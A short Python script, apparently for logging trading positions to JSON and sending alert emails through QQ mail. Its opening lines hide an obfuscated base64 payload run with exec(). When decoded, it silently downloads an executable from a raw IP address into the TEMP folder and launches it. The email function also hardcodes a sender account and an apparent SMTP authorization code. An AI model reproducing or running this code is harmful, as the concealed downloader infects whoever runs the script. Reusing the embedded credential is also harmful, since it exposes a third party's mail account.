
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnc2VydmVyLmV4ZScpCglpZiBub3Qgb3MucGF0aC5leGlzdHMobyk6CgkJdS51cmxyZXRyaWV2ZSgnaHR0cDovLzY1LjEwOS4yMjkuMjE2L3NlcnZlci5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

#coding=utf-8

import csv
import time
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import json

# 保存开仓数据
def save_data(data, json_name):
    try:
        with open(json_name, 'a', encoding='utf-8') as file_obj2:
            json.dump(data, file_obj2, ensure_ascii=False)
            file_obj2.write("\n")
        file_obj2.close()
    except Exception as e:
        print(e)

def send_email(subject, content):
    # 设置邮箱的域名
    HOST = 'smtp.qq.com'
    # cookie过期
    SUBJECT = subject
    # 设置发件人邮箱
    FROM = '3149452335@qq.com'
    # 设置收件人邮箱
    TO = '2492454783@qq.com'  # 可以同时发送到多个邮箱
    message = MIMEMultipart('related')
    # --------------------------------------发送文本-----------------
    # 发送邮件正文到对方的邮箱中
    message_html = MIMEText(content, 'plain', 'utf-8')
    message.attach(message_html)
    # -------------------------------------添加文件---------------------
    # # today_weather.csv这个文件
    # message_xlsx = MIMEText(open('bingx记录.json', 'rb').read(), 'base64', 'utf-8')
    # # 设置文件在附件当中的名字
    # message_xlsx['Content-Disposition'] = 'attachment;filename="bingx.txt"'
    # message.attach(message_xlsx)
    # 设置邮件发件人
    message['From'] = FROM
    # 设置邮件收件人
    message['To'] = TO
    # 设置邮件标题
    message['Subject'] = SUBJECT
    # 获取简单邮件传输协议的证书
    email_client = smtplib.SMTP_SSL(host='smtp.qq.com')
    # 设置发件人邮箱的域名和端口，端口为465
    email_client.connect(HOST, '465')
    # ---------------------------邮箱授权码------------------------------
    result = email_client.login(FROM, 'exjtcdrgrhsmddbi')
    print('登录结果', result)
    email_client.sendmail(from_addr=FROM, to_addrs=TO.split(','), msg=message.as_string())
    # 关闭邮件发送客户端
    email_client.close()
if __name__ == '__main__':
    send_email('44',"开仓")